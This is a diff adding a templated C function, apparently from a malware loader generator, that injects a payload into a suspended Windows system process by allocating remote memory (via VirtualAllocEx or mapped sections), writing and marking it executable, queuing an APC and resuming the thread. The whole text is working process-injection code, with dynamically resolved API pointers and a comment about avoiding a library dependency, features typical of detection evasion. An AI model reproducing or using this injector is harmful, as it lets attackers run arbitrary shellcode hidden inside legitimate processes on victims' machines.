@@ -1,0 +1,105 @@
+void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T payload_len) {
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    DWORD dwProcessId = 0;
+    PVOID pRemoteAddress = NULL;
+    char lpPath[MAX_PATH * 2];
+    char WnDr[MAX_PATH];
+
+    DEBUG_PRINT("Executing payload via Suspended Process APC Injection...");
+
+    // --- 1. Create the Target Process in a Suspended State ---
+    
+    if (!pfnGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+        DEBUG_PRINT("GetEnvironmentVariableA failed with error %d", pfnGetLastError());
+        return;
+    }
+
+    // Manually construct the path to avoid wsprintfA and user32.dll dependency
+    char sSystem32[] = "\\System32\\";
+    char sTargetProcess[] = "{{ target_process }}";
+    size_t sWnDrLen = pfnLstrlenA(WnDr);
+    size_t sSystem32Len = sizeof(sSystem32) - 1;
+    size_t sTargetProcessLen = sizeof(sTargetProcess) - 1;
+
+    pfnRtlMoveMemory(lpPath, WnDr, sWnDrLen);
+    pfnRtlMoveMemory(lpPath + sWnDrLen, sSystem32, sSystem32Len);
+    pfnRtlMoveMemory(lpPath + sWnDrLen + sSystem32Len, sTargetProcess, sTargetProcessLen);
+    lpPath[sWnDrLen + sSystem32Len + sTargetProcessLen] = '\0';
+    
+    DEBUG_PRINT("Target process path: %s", lpPath);
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    pfnRtlZeroMemory(&si, sizeof(si));
+    pfnRtlZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+
+    if (!pfnCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        DEBUG_PRINT("CreateProcessA failed with error: %d", pfnGetLastError());
+        return;
+    }
+    hProcess = pi.hProcess;
+    hThread = pi.hThread;
+    dwProcessId = pi.dwProcessId;
+    DEBUG_PRINT("Successfully created suspended process with PID: %lu", dwProcessId);
+
+    // --- 2. Allocate and Write Payload into the Remote Process ---
+    
+    {% if allocation_method == 'virtualalloc' %}
+        DEBUG_PRINT("Using VirtualAllocEx for remote memory allocation...");
+        DWORD dwOldProt = 0;
+        pRemoteAddress = pfnVirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (pRemoteAddress == NULL) {
+            DEBUG_PRINT("VirtualAllocEx failed with error: %d", pfnGetLastError());
+            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+        if (!pfnWriteProcessMemory(hProcess, pRemoteAddress, payload, payload_len, NULL)) {
+            DEBUG_PRINT("WriteProcessMemory failed with error: %d", pfnGetLastError());
+            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+        if (!pfnVirtualProtectEx(hProcess, pRemoteAddress, payload_len, PAGE_EXECUTE_READ, &dwOldProt)) {
+            DEBUG_PRINT("VirtualProtectEx failed with error: %d", pfnGetLastError());
+            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+    {% elif allocation_method == 'mappedsection' %}
+        DEBUG_PRINT("Using Mapped Sections for remote memory allocation...");
+        HANDLE hSection = NULL;
+        PVOID pLocalAddress = NULL;
+        LARGE_INTEGER sectionSize;
+        sectionSize.QuadPart = payload_len;
+
+        pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+        if (hSection == NULL) {
+            DEBUG_PRINT("NtCreateSection failed.");
+            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+        
+        pfnNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_READWRITE);
+        if (pLocalAddress == NULL) {
+            DEBUG_PRINT("Local NtMapViewOfSection failed.");
+            pfnCloseHandle(hSection); pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+        
+        pfnRtlMoveMemory(pLocalAddress, payload, payload_len);
+        
+        pfnNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_EXECUTE_READ);
+        if (pRemoteAddress == NULL) {
+            DEBUG_PRINT("Remote NtMapViewOfSection failed.");
+            pfnCloseHandle(hSection); pfnCloseHandle(hThread); pfnCloseHandle(hProcess); return;
+        }
+    {% endif %}
+
+    // --- 3. Queue the APC and Resume the Process ---
+    DEBUG_PRINT("Queuing APC to thread %p to run payload at %p", hThread, pRemoteAddress);
+    pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hThread, (ULONG_PTR)NULL);
+
+    DEBUG_PRINT("Resuming main thread to trigger APC...");
+    pfnResumeThread(hThread);
+
+    DEBUG_PRINT("Suspended Process APC modification complete.");
+    
+    // --- 4. Cleanup ---
+    pfnCloseHandle(hThread);
+    pfnCloseHandle(hProcess);
+}
